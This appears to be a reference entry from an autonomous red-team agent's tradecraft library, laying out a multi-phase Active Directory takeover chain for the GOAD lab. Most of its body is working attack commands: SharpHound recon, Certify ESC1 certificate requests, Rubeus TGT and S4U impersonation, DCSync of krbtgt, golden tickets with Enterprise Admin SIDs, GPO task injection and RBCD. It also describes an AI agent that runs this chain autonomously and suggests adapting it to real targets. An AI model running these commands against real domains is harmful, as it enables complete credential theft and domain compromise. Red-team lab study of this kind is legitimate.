---
name: Trust Walker — Full Chain Reference
category: delegation-abuse
subcategories: [trust-walker, demo-chain, full-chain, rbcd-adcs-gpo]
tradecraft_tags: [trust-walker, full-chain, demo, rbcd, adcs, gpo, delegation, reference]
mitre_attack: []
source:
  url: https://github.com/MythicAgents/sage
  license: Unknown
  maintained: true
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  The Trust Walker chain generates multiple high-signal events in sequence.
  The chain is designed for GOAD (Game of Active Directory) lab environment.
  In production environments, each step would be evaluated for stealth independently.
usage_examples:
  - description: Full Trust Walker execution (GOAD demo environment)
    args: "(see step-by-step chain below)"
opsec_notes: |
  The Trust Walker is a demo chain for the GOAD environment. In real engagements,
  each step must be individually assessed for detection risk. The chain here uses
  the GOAD-specific machine names and user accounts.
gotchas: |
  This is a GOAD-specific reference chain. Domain names, machine names, and account
  names are GOAD-specific (north.sevenkingdoms.local, essos.local, WINTERFELL, etc.).
  Adapt to actual target environment. The chain demonstrates Sage's ability to execute
  a multi-step AD privilege escalation autonomously.
related_ttps: [sharphound, certify, rubeus, standin, whisker, sharpgpoabuse, mimikatz,
               constrained-delegation-abuse, rbcd-abuse, acl-abuse-chain, adcs-esc8]
alternatives: []
common_args: {}
last_updated: 2026-05-29
---

# Trust Walker — Full Chain Reference

The Trust Walker is Sage's demonstration chain for the GOAD (Game of Active Directory)
lab environment — the August demo's target scenario. This document captures the full
multi-step chain that Sage orchestrates autonomously.

## Environment (GOAD)

```
Domains: north.sevenkingdoms.local, sevenkingdoms.local, essos.local
Key machines: WINTERFELL (north DC), KINGSLANDING (kingdom DC), MEEREEN (essos DC)
Key accounts: jon.snow, daenerys.targaryen, cersei.lannister, administrator
ADCS: Available in at least one domain
```

## Trust Walker Step-by-Step

### Phase 1: Reconnaissance

```
Step 1: SharpHound -c All --SearchForest --ZipFilename goad.zip
→ Ingest to BloodHound CE
→ Identify attack paths from controlled principal to Domain Admin

Step 2: Certify find /vulnerable
→ Identify ADCS ESC1/ESC6/ESC8 misconfigurations

Step 3: Review BloodHound paths:
→ Target: shortest path from jon.snow → Domain Admins
→ Identify delegation primitives, ACL paths, GPO abuse opportunities
```

### Phase 2: Initial Privilege Escalation (ESC1 path)

```
If ESC1 available:
  Step 4: Certify request /ca:NORTHCA\NORTH-CA /template:VulnTemplate /altname:administrator
  Step 5: Rubeus asktgt /user:administrator /certificate:<pfx> /getcredentials /show /ptt
  Step 6: Apollo pth /user:administrator /domain:NORTH /ntlm:<hash-from-step5>
  Step 7: Apollo dcsync /domain:north.sevenkingdoms.local /user:krbtgt
  → DOMAIN COMPROMISE (north.sevenkingdoms.local)

If delegation path available (constrained delegation):
  Step 4: Rubeus asktgt /user:<delegating-user> /rc4:<hash> /domain:north...
  Step 5: Rubeus s4u /ticket:<TGT> /impersonateuser:Administrator 
                   /msdsspn:cifs/WINTERFELL.north... /ptt
  → SYSTEM on WINTERFELL
```

### Phase 3: Cross-Domain Movement (sevenkingdoms.local)

```
If SID History / Forest Trust path:
  Step 8: Rubeus golden /krbtgt:<north-krbtgt> /domain:north... /sids:<EA-SID> /ptt
  → Enterprise Admin access
  
Step 9: Apollo dcsync /domain:sevenkingdoms.local /user:krbtgt
  → sevenkingdoms.local domain compromise
```

### Phase 4: essos.local (via trust)

```
Step 10: Use sevenkingdoms credentials to access essos.local trust
Step 11: SharpHound -c All -d essos.local
Step 12: essos.local escalation (repeat Phase 2 steps in essos context)
Step 13: dcsync /domain:essos.local /user:krbtgt
  → essos.local domain compromise
```

### Alternate Phase: GPO Abuse Path

```
If SharpHound shows GenericWrite on a GPO linked to sensitive OU:
  Grouper2 → identify writable GPO
  SharpGPOAbuse --AddComputerTask --GPOName 'VulnGPO' 
               --TaskName 'Update' --Command 'cmd.exe' --Arguments '/c ...'
  gpupdate /force (or wait for refresh)
  → Code execution as SYSTEM on all machines in GPO scope
```

### Alternate Phase: RBCD Path

```
If GenericWrite on a computer object:
  StandIn --computer mypc01 --password 'P@ss123!'
  StandIn --rbcd --computer mypc01 --target VICTIM$
  Rubeus asktgt /user:mypc01$ /password:'P@ss123!'
  Rubeus s4u /ticket:<TGT> /impersonateuser:Administrator 
             /msdsspn:cifs/VICTIM.DOMAIN /ptt
  → SYSTEM on VICTIM
```

## Sage's Autonomous Decision Points

At each step, Sage evaluates:
1. Is there a less-noisy alternative that achieves the same outcome?
2. Has operator approval been obtained for destructive or high-signal operations?
3. Are prerequisites met (tool available, target accessible, rights confirmed)?
4. What is the cleanup requirement for this step?

The goal state: Sage reports NT hash for krbtgt in each compromised domain,
demonstrating that the operator has effectively Domain Admin in all three GOAD forests.
